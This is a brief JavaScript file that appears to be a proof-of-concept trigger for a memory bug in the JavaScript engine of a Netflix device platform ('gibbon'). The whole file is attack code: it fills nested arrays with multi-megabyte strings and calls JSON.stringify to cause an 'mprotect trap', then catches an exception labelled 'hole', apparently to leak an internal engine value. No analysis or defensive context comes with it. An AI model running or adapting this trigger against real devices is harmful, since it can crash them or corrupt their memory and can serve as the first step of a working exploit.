//Trigger mprotect trap

nrdp_platform.gibbon._keyMappings = nrdpPartner?nrdpPartner.Keys || {}:{};

try {
    let a = [], b = [];
    let s = '"'.repeat(0x800000);
    a[20000] = s;
    for (let i = 0; i < 10; i++) a[i] = s;

    // 2 level nested arrat
    for (let i = 0; i < 2; i++) {
        b[i] = a;
    }

    // JSON.stringify recursively walks the array and allocates memory
    try {
        JSON.stringify(b);
    } catch (hole) {
        // Caught the hole
    }

    throw new Error("you won't get here");

} catch (e) {
    throw e;
}
